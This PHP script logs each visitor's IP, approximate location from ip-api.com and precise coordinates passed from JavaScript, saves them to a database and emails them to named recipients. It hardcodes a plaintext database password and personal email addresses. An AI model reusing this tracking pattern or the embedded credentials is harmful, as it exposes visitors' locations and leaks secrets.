<?php

/**
 * Función para enviar los resultados del ingreso por correo electrónico utilizando PHPMailer.
 * Aquí debes completar los detalles de configuración del servidor de correo saliente y los destinatarios.
 *
 * @param string $ip
 * @param object $locationData
 * @param float $latitude
 * @param float $longitude
 * @param string $date
 * @param string $time
 */
function sendEntryResultsByEmail($ip, $locationData, $latitude, $longitude, $date, $time)
{
    // Configuración de PHPMailer (comentada porque ya lo he configurado)
    /*$mail = new PHPMailer(true);
  $mail->isSMTP();
  $mail->Host = 'servidor_de_correo_saliente';
  $mail->SMTPAuth = true;
  $mail->Username = 'tu_correo';
  $mail->Password = 'tu_contraseña';
  $mail->SMTPSecure = 'tls';
  $mail->Port = 587;
  // Destinatario y remitente
  $mail->setFrom('tucorreo@gmail.com', 'Tu Nombre');
  $mail->addAddress('destinatario@gmail.com', 'Destinatario');
  use PHPMailer\PHPMailer\PHPMailer;
  use PHPMailer\PHPMailer\Exception;
  
  // Cargar las dependencias de PHPMailer
  require 'path/to/PHPMailer/src/Exception.php';
  require 'path/to/PHPMailer/src/PHPMailer.php';
  require 'path/to/PHPMailer/src/SMTP.php';
  */

    include "../../php scripts/configuracion-de-correo.php";

    $mail->ClearAllRecipients();

    $mail->AddAddress("dantecc10@gmail.com");
    $mail->AddCC("dante@castelancarpinteyro.com");
    $mail->AddCC("jeremy@castelancarpinteyro.com");

    $mail->IsHTML(true);  //podemos activar o desactivar HTML en mensaje

    // Contenido del correo electrónico
    $mail->Subject = 'Ingreso registrado';
    $mail->Body = "Ingreso registrado:\n\n";
    $mail->Body .= "IP: $ip\n";
    $mail->Body .= "Ubicación: {$locationData->city}, {$locationData->regionName}, {$locationData->country}\n";
    $mail->Body .= "Coordenadas: Latitud $latitude, Longitud $longitude\n";
    $mail->Body .= "Fecha: $date\n";
    $mail->Body .= "Hora: $time\n";

    try {
        $mail->send();
        echo 'El correo electrónico ha sido enviado correctamente.';
    } catch (Exception $e) {
        echo 'Error al enviar el correo electrónico: ' . $mail->ErrorInfo;
    }
}


// Obtener la IP del usuario
$ip = $_SERVER['REMOTE_ADDR'];

// Obtener la ubicación aproximada usando una API (en este caso, utilizaremos la API de ip-api.com)
$response = file_get_contents("http://ip-api.com/json/{$ip}");
$locationData = json_decode($response);

// Obtener las coordenadas precisas enviadas por JavaScript
$latitude = $_GET['latitude'];
$longitude = $_GET['longitude'];

// Obtener la hora y la fecha actual
$date = date('Y-m-d');
$time = date('H:i:s');

// Guardar los valores en variables de sesión
session_start();
$_SESSION['ip'] = $ip;
$_SESSION['location'] = $locationData;
$_SESSION['latitude'] = $latitude;
$_SESSION['longitude'] = $longitude;

// Insertar los valores en una tabla SQL (asumiendo que tienes una conexión y una tabla SQL establecidas)
// Aquí debes completar los detalles de tu conexión y consulta SQL
$servername = "tu_servidor";
$username = "tu_usuario";
$password = "tu_contraseña";
$dbname = "tu_base_de_datos";

$conn = new mysqli("localhost", "dantecc10", "Dantus23!!", "localizacionesLink");

if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}

$stmt = $conn->prepare("INSERT INTO ubicaciones (ip, location, latitude, longitude, date, time) VALUES (?, ?, ?, ?, ?, ?)");
$stmt->bind_param("ssddss", $ip, $locationData->city, $latitude, $longitude, $date, $time);
$stmt->execute();

$stmt->close();
$conn->close();

// Enviar los resultados del ingreso por correo electrónico
sendEntryResultsByEmail($ip, $locationData, $latitude, $longitude, $date, $time);
